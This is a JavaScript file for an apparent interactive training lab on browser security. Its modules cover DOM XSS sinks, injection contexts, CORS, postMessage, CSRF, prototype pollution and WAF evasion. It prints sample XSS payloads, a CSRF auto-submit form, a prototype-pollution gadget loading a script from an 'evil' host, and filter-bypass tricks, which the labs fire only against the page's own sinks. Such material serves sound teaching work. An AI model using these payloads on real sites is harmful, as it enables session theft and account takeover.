const KEY = "js-lab-v4";
const $ = (s, r=document) => r.querySelector(s);
const toast = (m) => { const t=$("#toast"); t.textContent=m; t.classList.add("show"); setTimeout(()=>t.classList.remove("show"), 2400); };

const mods = [
  { id:"m1", title:"DOM / BOM · Source & Sink", topic:"Foundation",
    blurb:"window ⊃ document ⊃ Node. taint from attacker Source to executing Sink." },
  { id:"m2", title:"Injection Contexts", topic:"XSS",
    blurb:"HTML body, quoted attribute, URL sink, JS string — each needs its own payload." },
  { id:"m3", title:"HTML sinks: innerHTML / insertAdjacentHTML", topic:"DOM XSS",
    blurb:"parser-inserted script vs event-handler gadget (onerror/onload)." },
  { id:"m4", title:"XHR / Fetch · responseType & credentials", topic:"AJAX",
    blurb:"readyState, responseType=document, credentials:include." },
  { id:"m5", title:"Same-Origin Policy", topic:"SOP",
    blurb:"tuple (scheme, host, port). SOP blocks read, not send." },
  { id:"m6", title:"CORS misconfiguration", topic:"CORS",
    blurb:"reflected ACAO + ACAC, wildcard vs credentials, null origin, preflight." },
  { id:"m7", title:"window.postMessage", topic:"Cross-window",
    blurb:"targetOrigin='*' and listener without event.origin check." },
  { id:"m8", title:"CSRF · Cookie · SameSite", topic:"CSRF",
    blurb:"simple request, Lax GET, token steal via same-origin XSS." },
  { id:"m9", title:"XSS taxonomy", topic:"XSS",
    blurb:"Reflected / Stored / DOM / Blind / Self. View-Source vs runtime DOM." },
  { id:"m10", title:"Prototype Pollution · WAF evasion", topic:"Advanced",
    blurb:"__proto__ gadget, fromCharCode, bracket notation, NFKD vs filter order." },
];

function load(){ try { return JSON.parse(localStorage.getItem(KEY)||"{}"); } catch { return {}; } }
function save(s){ localStorage.setItem(KEY, JSON.stringify(s)); }
function done(id){ const s=load(); s[id]=true; save(s); renderHome(); }

function renderHome(){
  const s=load();
  const n=mods.filter(m=>s[m.id]).length;
  $("#prog-text").textContent = n+" / "+mods.length;
  $("#prog-bar").style.width = (n/mods.length*100)+"%";
  $("#mod-list").innerHTML = mods.map(m => `
    <button class="card ${s[m.id]?"done":""}" data-id="${m.id}">
      <b>${m.title}</b>
      <span>${m.blurb}</span>
      <i class="tag">${m.topic}${s[m.id]?" · done":""}</i>
    </button>`).join("");
  $("#mod-list").onclick = (e) => {
    const b=e.target.closest("[data-id]"); if(b) openMod(b.dataset.id);
  };
}
function openHome(){
  $("#lesson").classList.remove("active");
  $("#home").classList.add("active");
  renderHome();
}
function wrap(title, html){
  $("#home").classList.remove("active");
  const el=$("#lesson");
  el.classList.add("active");
  el.innerHTML = `<div class="lesson"><div class="crumbs"><button type="button" id="back">← modules</button></div><h2>${title}</h2>${html}</div>`;
  $("#back").onclick = openHome;
}
function markBtn(id){
  return `<div class="row"><button class="primary" id="mark" type="button">mark module done</button></div>`;
}
function afterMark(id){
  const b=$("#mark"); if(b) b.onclick=()=>{ done(id); toast("saved"); openHome(); };
}
function openMod(id){
  const m=mods.find(x=>x.id===id);
  wrap(m.title, builders[id]());
  if(hooks[id]) hooks[id]();
  afterMark(id);
}

const builders = {
  m1(){ return `<div class="block"><h3>Browser object model</h3>
<p><b>BOM</b> = Browser Object Model: <code>window</code>, <code>location</code>, <code>history</code>, <code>navigator</code>.</p>
<p><b>DOM</b> = Document Object Model. Prototype chain: <code>HTMLElement → Element → Node → EventTarget → Object</code>.</p>
<pre>window === this
document === window.document
location === window.location === document.location</pre></div>
<div class="block"><h3>Source → Sink (taint flow)</h3>
<p>Client-side bug = attacker-controlled Source reaches an executing Sink without sanitization.</p>
<pre>// Sources
location.href / hash / search / pathname
document.URL / documentURI / referrer / cookie
history.state / window.name / event.data
xhr.responseText / fetch().text() / URLSearchParams

// Sinks
innerHTML / outerHTML / insertAdjacentHTML / document.write
eval / Function / setTimeout(string)
location.href / assign / replace
element.src / href / setAttribute("onerror")
postMessage(data, "*")</pre></div>
<div class="lab"><label>simulated Source (like location.hash.slice(1))</label>
<input id="src" type="text" value="<img src=x onerror=console.log('sink-fired')>" />
<div class="row">
<button id="to-text" type="button">textContent</button>
<button id="to-html" type="button">innerHTML</button>
<button id="to-adj" type="button">insertAdjacentHTML</button>
<button id="to-loc" type="button">location.hash = value</button>
</div>
<div class="out" id="sink-out">sink empty</div>
<pre id="m1-note"></pre></div>${markBtn("m1")}`; },
  m2(){ return `<div class="block"><h3>Context decides the payload</h3>
<pre><div>USER</div>
payload: <img src=x onerror=alert(1)>

<input value="USER">
payload: " autofocus onfocus=alert(1) x="

<a href="USER">
payload: javascript:alert(document.domain)

<script>var q = "USER";</script>
payload: ";alert(1);//</pre></div>
<div class="lab"><label>context + payload</label>
<select id="ctx">
<option value="href">URL sink — a.href</option>
<option value="attr">quoted attr — input.value</option>
<option value="html">HTML body — innerHTML</option>
<option value="js">JS string</option>
</select>
<input id="pay" type="text" value="javascript:alert(1)" style="margin-top:8px" />
<div class="row"><button id="render-ctx" class="primary" type="button">render into sink</button></div>
<div class="out" id="ctx-out"></div>
<pre id="ctx-code"></pre></div>${markBtn("m2")}`; },
  m3(){ return `<div class="block"><h3>HTML parser on assignment</h3>
<p><code>innerHTML</code> parses the string. Parser-inserted <code><script></code> does not run. Gadgets that do: <code>img onerror</code>, <code>svg onload</code>, <code>iframe src=javascript:</code>, <code>details ontoggle</code>.</p>
<p>Safe text: <code>textContent</code>. Controlled HTML: DOMPurify / Trusted Types.</p>
<pre>el.innerHTML = location.hash.slice(1);
el.insertAdjacentHTML("beforeend", source);
el.outerHTML = source;</pre></div>
<div class="lab"><label>payload</label>
<input id="p3" type="text" value='<img src=x onerror="this.outerHTML='[onerror executed]'">' />
<div class="row">
<button id="html3" class="primary" type="button">innerHTML</button>
<button id="text3" type="button">textContent</button>
<button id="adj3" type="button">insertAdjacentHTML</button>
</div>
<div class="out" id="o3"></div></div>${markBtn("m3")}`; },
  m4(){ return `<div class="block"><h3>XMLHttpRequest state machine</h3>
<pre>UNSENT 0 → OPENED 1 → HEADERS_RECEIVED 2 → LOADING 3 → DONE 4

const xhr = new XMLHttpRequest();
xhr.responseType = "document";
xhr.withCredentials = true;
xhr.onload = () => xhr.response.querySelector("[name=csrf]").value;
xhr.open("GET", "/my-account");
xhr.send();

await fetch("/my-account", { credentials: "include" });</pre>
<p>Cross-origin read without CORS throws TypeError. The request may still have been sent.</p></div>
<div class="lab"><p>same-origin fetch("child.html") + DOMParser</p>
<div class="row">
<button id="fetch4" class="primary" type="button">fetch + DOMParser</button>
<button id="xhr4" type="button">XHR</button>
</div>
<pre id="o4">// output</pre></div>${markBtn("m4")}`; },
  m5(){ return `<div class="block"><h3>Origin tuple</h3>
<p>Origin = scheme://host:port. Path and query are not part of origin.</p>
<pre>https://a.com vs http://a.com          different scheme
https://a.com vs https://a.com:8443    different port
https://a.com vs https://api.a.com     different host
https://a.com/x vs https://a.com/y     SAME origin</pre>
<p>SOP blocks <b>reading</b> a cross-origin response. Sending is usually allowed — that is why CSRF exists. XSS runs inside the victim origin, so SOP does not apply.</p>
<p><b>XSSI:</b> <script src=cross-origin> is exempt from SOP. If the response is JS that assigns a secret to a global, the attacker page reads it.</p></div>
<div class="lab"><pre id="orig"></pre>
<div class="quiz">
<label><input type="radio" name="q5" value="0"> SOP blocks CSRF form submit</label>
<label><input type="radio" name="q5" value="1"> SOP blocks JS from reading another origin's JSON</label>
<label><input type="radio" name="q5" value="2"> Different paths are always cross-origin</label>
</div>
<button id="chk5" type="button">check</button>
<div class="out" id="o5"></div></div>${markBtn("m5")}`; },
  m6(){ return `<div class="block"><h3>CORS headers</h3>
<pre>Origin: https://evil.example
Access-Control-Allow-Origin: https://evil.example
Access-Control-Allow-Credentials: true</pre>
<ul>
<li>ACAC:true forbids ACAO:* — browser hides the body from JS.</li>
<li>Reflected Origin + credentials = credentialed read from attacker origin.</li>
<li>Weak regex / contains-check: target.com.attacker.tld</li>
<li>Origin: null from sandboxed iframe / data: / redirect chain.</li>
<li>Preflight OPTIONS for non-simple method or Content-Type: application/json.</li>
</ul></div>
<div class="lab"><label>attacker Origin / reflected ACAO</label>
<input id="ori6" type="text" value="https://evil.lab" />
<select id="acac6"><option value="true">ACAC true</option><option value="false">ACAC false</option></select>
<div class="row"><button id="sim6" class="primary" type="button">simulate browser decision</button></div>
<pre id="o6"></pre></div>${markBtn("m6")}`; },
  m7(){ return `<div class="block"><h3>postMessage API</h3>
<pre>otherWindow.postMessage(message, targetOrigin);
window.addEventListener("message", (event) => {
  if (event.origin !== "https://trusted.example") return;
  if (event.source !== expectedWindow) return;
});</pre>
<ul>
<li>targetOrigin "*" + secret = any embedder/opener receives it.</li>
<li>No origin allowlist + innerHTML/eval sink = XSS from attacker origin.</li>
<li>Substring origin check bypass: trusted.com.attacker.tld</li>
</ul></div>
<div class="lab"><p>child listener: box.innerHTML = event.data (no origin check)</p>
<iframe class="child" id="child7" src="child.html"></iframe>
<input id="msg7" type="text" value='<img src=x onerror=parent.postMessage("child-sink-hit","*")>' />
<div class="row"><button id="send7" class="primary" type="button">parent → child.postMessage(payload, "*")</button></div></div>${markBtn("m7")}`; },
  m8(){ return `<div class="block"><h3>CSRF preconditions</h3>
<ul>
<li>state-changing action after login</li>
<li>session in Cookie (not mandatory Authorization: Bearer header)</li>
<li>missing / predictable CSRF token</li>
<li>request stays simple so no preflight</li>
</ul>
<pre><form action="https://target.example/change-email" method="POST">
  <input name="email" value="attacker@evil">
</form>
<script>document.forms[0].submit()</script></pre>
<p>SameSite=Lax still sends cookie on top-level GET. SameSite=Strict first hop blocked; open-redirect on victim origin makes hop 2 same-site. XSS→CSRF: XHR same-origin, read token from DOM, replay POST.</p></div>
<div class="lab"><div class="quiz">
<label><input type="radio" name="q8" value="0"> Bearer-only API is exploitable with a classic HTML form</label>
<label><input type="radio" name="q8" value="1"> Cookie session + SameSite=None ⇒ cross-site form sends the cookie</label>
<label><input type="radio" name="q8" value="2"> CSRF means reading the victim JSON</label>
</div>
<button id="chk8" type="button">check</button>
<div class="out" id="o8"></div></div>${markBtn("m8")}`; },
  m9(){ return `<div class="block"><h3>Taxonomy</h3>
<pre>Reflected  payload in request, echoed in that response. Visible in View-Source.
Stored     persisted, rendered for another victim.
DOM-based  client source (hash, history, postMessage) → client sink.
           View-Source shows pre-JS HTML, not the runtime DOM.
Blind      no visible output; start with <img src=collab>.
Self-XSS   only your session; chain with login CSRF.</pre></div>
<div class="lab"><div class="quiz">
<label><input type="radio" name="q9" value="0"> GET /search?q= — server prints q into HTML</label>
<label><input type="radio" name="q9" value="1"> location.hash → innerHTML; backend never sees it</label>
<label><input type="radio" name="q9" value="2"> comment stored in DB, rendered on other profiles</label>
</div>
<button id="chk9" type="button">check</button>
<div class="out" id="o9"></div></div>${markBtn("m9")}`; },
  m10(){ return `<div class="block"><h3>Prototype Pollution</h3>
<pre>function merge(t,s){ for (let k in s) t[k]=s[k]; }
merge({}, JSON.parse('{"__proto__":{"admin":true}}'));
({}).admin === true

b.__proto__.transport_url = "https://evil/x.js";
script.src = config.transport_url;</pre>
<p>Query gadgets: ?__proto__[admin]=true or constructor[prototype][admin]=true if merge is not prototype-safe.</p></div>
<div class="block"><h3>WAF evasion</h3>
<pre>String.fromCharCode(97,108,101,114,116)
window["alert"](1)
window[atob("YWxlcnQ=")](1)
Function\`alert(1)\`
throw onerror=alert,1
normalize(NFKD) AFTER waf()  // wrong order</pre>
<p>Decode / normalize / lowercase BEFORE the filter.</p></div>
<div class="lab"><div class="row">
<button id="build10" class="primary" type="button">fromCharCode(97,108,101,114,116)</button>
<button id="pp10" type="button">pollute Object.prototype.labFlag</button>
<button id="ppclr" type="button">delete labFlag</button>
</div>
<pre id="o10"></pre></div>${markBtn("m10")}`; },
};

const hooks = {
  m1(){
    const out=$("#sink-out"), note=$("#m1-note"), val=()=>$("#src").value;
    $("#to-text").onclick=()=>{ out.textContent=val(); note.textContent="// textContent → no HTML parse"; };
    $("#to-html").onclick=()=>{ out.innerHTML=val(); note.textContent="// innerHTML → HTML parser + handlers"; };
    $("#to-adj").onclick=()=>{ out.textContent=""; out.insertAdjacentHTML("beforeend", val()); note.textContent="// insertAdjacentHTML — same parser"; };
    $("#to-loc").onclick=()=>{ location.hash=val(); note.textContent="// location.hash = "+location.hash+"\n// Source only; a sink must consume it"; };
  },
  m2(){
    $("#render-ctx").onclick=()=>{
      const ctx=$("#ctx").value, p=$("#pay").value, o=$("#ctx-out");
      o.innerHTML="";
      if(ctx==="href"){ const a=document.createElement("a"); a.href=p; a.textContent="URL sink"; o.append(a); $("#ctx-code").textContent=`<a href="${p}">`+"\nprotocol "+a.protocol; }
      else if(ctx==="attr"){ o.innerHTML=`<input value="${p}">`; $("#ctx-code").textContent=`<input value="${p}">`; }
      else if(ctx==="html"){ o.innerHTML=p; $("#ctx-code").textContent="container.innerHTML = payload"; }
      else { $("#ctx-code").textContent=`var q = "${p}";`; o.textContent="JS string context"; }
    };
  },
  m3(){
    $("#html3").onclick=()=>{$("#o3").innerHTML=$("#p3").value;};
    $("#text3").onclick=()=>{$("#o3").textContent=$("#p3").value;};
    $("#adj3").onclick=()=>{ const o=$("#o3"); o.textContent=""; o.insertAdjacentHTML("beforeend", $("#p3").value); };
  },
  m4(){
    $("#fetch4").onclick=async()=>{
      try{
        const r=await fetch("child.html", { credentials:"same-origin" });
        const t=await r.text();
        const doc=new DOMParser().parseFromString(t,"text/html");
        $("#o4").textContent="status "+r.status+"\ncontent-type "+r.headers.get("content-type")+"\ntitle "+doc.title+"\n"+t.slice(0,220);
      }catch(e){ $("#o4").textContent=String(e); }
    };
    $("#xhr4").onclick=()=>{ const xhr=new XMLHttpRequest(); xhr.onload=()=>{$("#o4").textContent="readyState="+xhr.readyState+" status="+xhr.status+"\n"+xhr.responseText.slice(0,220);}; xhr.open("GET","child.html"); xhr.send(); };
  },
  m5(){
    $("#orig").textContent="location.origin = "+location.origin+"\n"+location.href+"\n"+location.protocol+" "+location.hostname+" "+location.port;
    $("#chk5").onclick=()=>{ const v=document.querySelector("[name=q5]:checked"); $("#o5").innerHTML = v&&v.value==="1" ? '<span class="ok">correct — SOP is a read restriction</span>' : '<span class="bad">wrong — forms still send; path is not origin</span>'; };
  },
  m6(){
    $("#sim6").onclick=()=>{
      const o=$("#ori6").value.trim(); const acac=$("#acac6").value==="true";
      const block = o==="*" && acac; const exp = o!=="*" && acac && o.length>0;
      $("#o6").textContent="HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: "+o+"\nAccess-Control-Allow-Credentials: "+acac+"\n\n{\"email\":\"victim@target\"}\n\nexpose body? "+(block?"NO (* + credentials)":"YES")+"\ncredentialed attacker read? "+(exp?"YES — reflected ACAO + ACAC":"no");
    };
  },
  m7(){ $("#send7").onclick=()=>{$("#child7").contentWindow.postMessage($("#msg7").value, "*");}; },
  m8(){ $("#chk8").onclick=()=>{ const v=document.querySelector("[name=q8]:checked"); $("#o8").innerHTML = v&&v.value==="1" ? '<span class="ok">correct — CSRF is forced write with browser cookie</span>' : '<span class="bad">Bearer does not ride a simple form. CSRF is not a read.</span>'; }; },
  m9(){ $("#chk9").onclick=()=>{ const v=document.querySelector("[name=q9]:checked"); $("#o9").innerHTML = v&&v.value==="1" ? '<span class="ok">DOM-based</span>' : '<span class="bad">0 = reflected, 2 = stored</span>'; }; },
  m10(){
    $("#build10").onclick=()=>{ const s=String.fromCharCode(97,108,101,114,116); $("#o10").textContent=JSON.stringify(s)+"\nwindow[s]===alert → "+(window[s]===alert)+"\natob YWxlcnQ= → "+atob("YWxlcnQ="); };
    $("#pp10").onclick=()=>{ Object.prototype.labFlag="polluted"; const o={}; $("#o10").textContent="({}).labFlag === "+JSON.stringify(o.labFlag)+"\nhasOwnProperty labFlag === "+({}).hasOwnProperty("labFlag"); };
    $("#ppclr").onclick=()=>{ try{ delete Object.prototype.labFlag; }catch(e){} $("#o10").textContent="deleted; ({ }).labFlag === "+({}).labFlag; };
  },
};

$("#reset").onclick=()=>{ localStorage.removeItem(KEY); renderHome(); toast("progress cleared"); };
renderHome();
